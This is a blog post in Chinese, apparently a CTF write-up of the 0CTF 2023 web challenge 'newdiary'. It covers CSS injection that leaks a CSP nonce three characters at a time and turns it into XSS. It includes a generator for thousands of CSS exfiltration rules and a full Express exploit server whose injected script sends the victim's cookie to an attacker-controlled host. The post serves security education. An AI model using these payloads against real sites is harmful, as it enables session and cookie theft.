---
来源: https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/
类型: html
获取日期: 2026-06-29
---

0CTF 2023 筆記 - Huli's blog


window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', 'G-1393J2EVCZ');


if (localStorage.getItem('dark-mode')) {
if (localStorage.getItem('dark-mode') === 'true') {
document.body.classList.add('dark-mode')
}
} else {
if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
document.body.classList.add('dark-mode')
}
}


[Huli's blog](/)

[文章列表](/archives)
[隨意聊](/notes)
[分類](/categories)
[關於我](/about)

目錄

[1  **Web - newdiary (14 solves)**](#web-newdiary-14-solves)
[1.1  用 CSS 偷 nonce](#用-css-偷-nonce)
[1.2  產生 CSS](#產生-css)
[1.3  Exploit](#exploit)


[English](/2023/12/11/en/0ctf-2023-writeup/)

如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：[表單連結](https://forms.gle/XuWyRC5qtSd2ANta8)。

# 0CTF 2023 筆記

2023年12月11日


[Security](/categories/Security/)

今年的 0CTF 一共有三道 web 題，其中一道題目是 client-side 的，我就只解這題而已，順利拿到 first blood，這篇簡單記錄一下心得。

關鍵字列表：

1. CSS injection
2. CSS exfiltration

## Web - newdiary (14 solves)

題目就是個典型的 note app，可以建立筆記然後回報給 admin bot，筆記只有限制長度，並沒有做過濾，在 client 也是直接用 innerHTML，所以很明顯有 HTML injection：

```
load = () => {
    document.getElementById("title").innerHTML = ""
    document.getElementById("content").innerHTML = ""
    const param = new URLSearchParams(location.hash.slice(1));
    const id = param.get('id');
    let username = param.get('username');
    if (id && /^[0-9a-f]+$/.test(id)) {
        if (username === null) {
            fetch(`/share/read/${id}`).then(data => data.json()).then(data => {
                const title = document.createElement('p');
                title.innerText = data.title;
                document.getElementById("title").appendChild(title);
        
                const content = document.createElement('p');
                content.innerHTML = data.content;
                document.getElementById("content").appendChild(content);
            })
        } else {
            fetch(`/share/read/${id}?username=${username}`).then(data => data.json()).then(data => {
                const title = document.createElement('p');
                title.innerText = data.title;
                document.getElementById("title").appendChild(title);

                const content = document.createElement('p');
                content.innerHTML = data.content;
                document.getElementById("content").appendChild(content);
            })
        }
        document.getElementById("report").href = `/report?id=${id}&username=${username}`;
    }
    window.removeEventListener('hashchange', load);
}
load();
window.addEventListener('hashchange', load);
```

這邊值得注意的一點是如果改變 hash 的話會載入新的 note，這點滿重要的。

而 CSP 的部份如下：

```
<meta http-equiv="Content-Security-Policy"
    content="script-src 'nonce-<%= nonce %>'; frame-src 'none'; object-src 'none'; base-uri 'self'; style-src 'unsafe-inline' https://unpkg.com">
```

每一個 response 都有不同的 nonce，長度為 32 位，每一個字元是 a-zA-Z0-9，有 36 種組合。CSS 的部分允許 inline 跟 unpkg，因為 unpkg 就只是去 npm 上拿，所以可以想成是允許任何的外部 style。

admin bot 的部份只能訪問 `/share/read`，訪問後會停留 30 秒，這個 timeout 應該滿明顯是要花時間 leak 什麼東西：

```
await page.goto(
  `http://localhost/share/read#id=${id}&username=${username}`,
  { timeout: 5000 }
);
await new Promise((resolve) => setTimeout(resolve, 30000));
await page.close();
```

對了，flag 在 cookie 裡面，所以目標是 XSS。

其實看完題目之後我覺得滿直覺的，很明顯要想辦法用 CSS 偷到 nonce，偷到 nonce 以後建立一個新的 note，然後改變 hash 去載入新的 note，就可以 XSS。

但有一些小細節要注意就是了，像是 admin bot 只能訪問某一個筆記，所以要先用 `<meta>` redirect 到自己的 server，再用 `window.open` 去打開新的筆記，這樣偷到 nonce 以後才能藉由改變 hash 去更新內容，確保 nonce 不會變。

總之呢，流程如下：

1. 新增一個 note，內容為 `<meta http-equiv="refresh" content="0;URL=https://my_server">`，id 是 0
2. 新增另一個 note，內容為 `<style>@import "https://unpkg.com/pkg/steal.css"</style>`，id 是 1
3. 讓 admin bot 訪問 id 是 0 的 note
4. admin bot 被導到 my server，此時可以在我的 origin 執行任意 JavaScript
5. 執行 `w = window.open(note_1)`，開始偷 nonce
6. 拿到偷來的 nonce
7. 新增最後一個 note，內容為 `<script nonce=xxx></script>`，id 為 2
8. 執行 `w.location = '.../share/read#id=2'`
9. XSS

這之中最麻煩的部分就在於用 CSS 偷 nonce 了。

### 用 CSS 偷 nonce

我以前剛好有研究過用 CSS 偷東西：[用 CSS 來偷資料 - CSS injection（上）](https://blog.huli.tw/2022/09/29/css-injection-1/)，但裡面講到的做法其實這一題行不通。

由於 nonce 的可能性有太多種，所以一個字元一個字元偷是最快的方法，但這種做法要利用 `@import` 加上 blocking 的方式，這一題的外部連結只能到 unpkg，是靜態檔案，沒辦法。

另一種做法剛好前陣子才看過但還沒更新到文章：[Code Vulnerabilities Put Proton Mails at Risk](https://www.sonarsource.com/blog/code-vulnerabilities-leak-emails-in-proton-mail/#splitting-the-url-into-smaller-chunks)

這做法滿聰明的，把一段字切成很多小字串，每個字串有三個字元，我們對 a-zA-Z0-9 做三個字的全排列組合，像這樣：

```
script[nonce*="aaa"]{--aaa:url("https://server/leak?q=aaa")}
script[nonce*="aab"]{--aab:url("https://server/leak?q=aab")}
...
script[nonce*="ZZZ"]{--ZZZ:url("https://server/leak?q=ZZZ")}

script{
  display: block;
  background-image: -webkit-cross-fade(
    var(--aaa, none),
    -webkit-cross-fade(
      var(--aab, none), var(--ZZZ, none), 50%
    ),
    50%
  )
```

用 `-webkit-cross-fade` 是為了要載入多個圖片，細節可以參考上面貼的文章。

例如說 nonce 是 abc123 好了，server 就會收到：

1. abc
2. bc1
3. c12
4. 123

這四種字串，而順序可能會不一樣，但只要按照規則組合起來，就可以得到 abc123。當然，也有可能會有多種組合或是不確定頭尾的情形，但那就當作 edge case，重新再試一次就行了。

用這樣的方式偷 nocne，以這題來說會有 36^3 = 46656 個規則，是可以接受的長度。

### 產生 CSS

剛好之前在工作上也碰到類似的情境，所以手邊已經有寫好的腳本了，改一下就可以用。

這題如果把全部規則都套在同一個元素上，似乎會因為規則太多之類的讓 Chrome 直接 crash（至少我本地是這樣），所以我就把規則分三份，順便套在三個不同元素。

```
const fs = require('fs')
let chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
const host = 'https://ip.ngrok-free.app'

let arr = []
for(let a of chars) {
    for(let b of chars) {
        for(let c of chars) {
            let str = a+b+c;
            arr.push(str)
        }
    }
}

let payload1 = ''
let crossPayload1 = 'url("/")'
let payload2 = ''
let crossPayload2 = 'url("/")'
let payload3 = ''
let crossPayload3 = 'url("/")'

const third = Math.floor(arr.length / 3);
const arr1 = arr.slice(0, third); 
const arr2 = arr.slice(third, 2 * third); 
const arr3 = arr.slice(2 * third); 

for(let str of arr1) {
    payload1 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload1 = `-webkit-cross-fade(${crossPayload1}, var(--${str}, none), 50%)`
}

for(let str of arr2) {
    payload2 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload2 = `-webkit-cross-fade(${crossPayload2}, var(--${str}, none), 50%)`
}

for(let str of arr3) {
    payload3 += `script[nonce*="${str}"]{--${str}:url("${host}/leak?q=${str}")}\n`
    crossPayload3 = `-webkit-cross-fade(${crossPayload3}, var(--${str}, none), 50%)`
}

payload1 = `${payload1} script{display:block;} script{background-image: ${crossPayload1}}`
payload2 = `${payload2}script:after{content:'a';display:block;background-image:${crossPayload2} }`
payload3 = `${payload3}script:before{content:'a';display:block;background-image:${crossPayload3} }`

fs.writeFileSync('exp1.css', payload1, 'utf-8');
fs.writeFileSync('exp2.css', payload2, 'utf-8');
fs.writeFileSync('exp3.css', payload3, 'utf-8');
```

接著把跑完的檔案發佈到 npm，就有一個 unpkg 的網址了。

### Exploit

寫得滿亂的有點懶得整理，但基本上跑起來以後訪問 `/start` 就會開始自動跑整個流程。

這題因為運氣好之前就有看過那篇文章，所以開賽後半小時就大概知道怎麼解了，剩下兩小時都在寫 code 😆

```
import express from 'express'
import {fetch, CookieJar} from "node-fetch-cookies";

const app = express()
const port = 3000

const host = 'http://new-diary.ctf.0ops.sjtu.cn'
const selfHost = 'https://ip.ngrok-free.app'
const cssUrl = 'https://unpkg.com/[email protected]'

const getRandomStr = len => Array(len).fill().map(_ => Math.floor(Math.random()*16).toString(16)).join('')

let leaks = []
let cookieJar = new CookieJar();
let username = '';
let hasToken = false;

function mergeWords(arr, ending) {
  if (arr.length === 0) return ending
  if (!ending) {
    for(let i=0; i<arr.length; i++) {
      let isFound = false
      for(let j=0; j<arr.length; j++) {
        if (i === j) continue

        let suffix = arr[i][1] + arr[i][2] 
        let prefix = arr[j][0] + arr[j][1]

        if (suffix === prefix) {
          isFound = true
          continue
        }
      }
      if (!isFound) {
        console.log('ending:', arr[i])
        return mergeWords(arr.filter(item => item!==arr[i]), arr[i])
      }
    }

    console.log('Error, please try again')
    return
  }

  let found = []
  for(let i=0; i<arr.length; i++) {
    let length = ending.length
    let suffix = ending[0] + ending[1]
    let prefix = arr[i][1] + arr[i][2]

    if (suffix === prefix) {
      found.push([arr.filter(item => item!==arr[i]), arr[i][0] + ending])
    }
  }

  return found.map((item) => {
    return mergeWords(item[0], item[1])
  })
}

function handleLeak() {
  let str = ''
  let arr = [...leaks]
  leaks = []

  console.log('received:', arr)
  const merged = mergeWords(arr, null);
  console.log('leaked:', merged.flat(99))
  return merged.flat(99)
}

async function createNote(title, content){
  return await fetch(cookieJar, host + '/write', {
    method: 'POST',
    headers: {
      'content-type': 'application/x-www-form-urlencoded',
    },
    body: `title=${encodeURIComponent(title)}&content=${encodeURIComponent(content)}`
  })
}

async function getNotes() {
  return await fetch(cookieJar, host + '/', {
  }).then(res => res.text())
}

async function share(id) {
  return await fetch(cookieJar, host + '/share_diary/' + id, {
  }).then(res => res.text())
}

async function report(username, id) {
  return await fetch(cookieJar, `${host}/report?username=${username}&id=${id}` , {
  }).then(res => res.text())
}

app.get('/', (req, res) => {
  res.send('Hello World!')
})

app.get('/start', async (req, res) => {
  // create ccount
  username = getRandomStr(8)
  let password = getRandomStr(8)
  leaks = []
  hasToken = false

  console.log({
    username,
    password
  })

  const response = await fetch(cookieJar, host + '/login', {
    method: 'post',
    headers: {
      'content-type': 'application/x-www-form-urlencoded'
    },
    body: `username=${username}&password=${password}`
  })

  const resp = await createNote('note1', `<meta http-equiv="refresh" content="0;URL=${selfHost}/exp">`)

  await createNote('note2', `<style>@import "${cssUrl}/exp1.css";@import "${cssUrl}/exp2.css";@import "${cssUrl}/exp3.css";</style>`)

  console.log('done')

  await share(0)
  await share(1)

  console.log('report username:', username)
  console.log(await report(username, 0))

  res.send('done')

})

app.get('/leak', async (req, res) => {
    leaks.push(req.query.q)
    console.log('recevied:', req.query.q, leaks.length)
    if (leaks.length === 30) {
      const result = handleLeak()
      // create a new note
      await createNote(
        'note3', 
        result.map(nonce => `<iframe srcdoc="<script nonce=${nonce}>top.location='${selfHost}/flag?q='+encodeURIComponent(top.document.cookie)</script>"></iframe>`)
      );
      await share(2)
      hasToken = true;
      console.log('note3 cteated')
    }
    res.send('ok')
})

app.get('/flag', (req, res) => {
  console.log('flag', req.query.q)
  res.send('flag')
})

app.get('/hasToken', (req, res) => {
  console.log('polling...', hasToken)
  if (hasToken) {
    res.send('hasToken')
  } else {
    res.send('no')
  }
})

app.get('/exp', (req, res) => {
  console.log('visit exp')
  res.setHeader('content-type', 'text/html')
  res.send(`
    <script>
      let w = window.open('http://localhost/share/read#id=1&username=${username}')
      function polling() {
        fetch('/hasToken').then(res => res.text()).then((res) => {
          if (res === 'hasToken') {
            w.location = 'http://localhost/share/read#id=2&username=${username}'
          }
        })

        setTimeout(() => {
          polling();
        }, 500)
      }
      polling()
    </script>
  `)
})

app.listen(port, () => {
  console.log(`Example app listening on port ${port}`)
})
```

話說如果沒看過那篇文章的話，不確定自己是不是能想到這個解法 😅

[#Security](/tags/Security/)

[DiceCTF 2024 筆記](/2024/02/12/dicectf-2024-writeup/)

[一堆來不及做的 web 與 XSS 題目](/2023/12/03/xss-and-web-challenges/)

### 評論

© 2026 Huli 
Powered by [Hexo](http://hexo.io/) & [Minos](https://github.com/ppoffice/hexo-theme-minos)

[GitHub](https://github.com/ppoffice/hexo-theme-minos "GitHub")

繁體中文

[English](/2023/12/11/en/0ctf-2023-writeup/)


(function ($) {
$(document).ready(function () {
if (typeof($.fn.lightGallery) === 'function') {
$('.article.gallery').lightGallery({ selector: '.gallery-item' });
}
});
})(jQuery);


.hljs {
position: relative;
}
.hljs .clipboard-btn {
float: right;
color: #9a9a9a;
background: none;
border: none;
cursor: pointer;
}
.hljs .clipboard-btn:hover {
color: #8a8a8a;
}
.hljs > .clipboard-btn {
display: none;
position: absolute;
right: 4px;
top: 4px;
}
.hljs:hover > .clipboard-btn {
display: inline;
}
.hljs > figcaption > .clipboard-btn {
margin-right: 4px;
}

$(document).ready(function () {
$('figure.hljs').each(function(i, figure) {
var codeId = 'code-' + i;
var code = figure.querySelector('.code');
var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
code.id = codeId;
copyButton.addClass('clipboard-btn');
copyButton.attr('data-clipboard-target-id', codeId);
var figcaption = figure.querySelector('figcaption');
if (figcaption) {
figcaption.append(copyButton[0]);
} else {
figure.prepend(copyButton[0]);
}
})
var clipboard = new ClipboardJS('.clipboard-btn', {
target: function(trigger) {
return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
}
});
clipboard.on('success', function(e) {
e.clearSelection();
})
})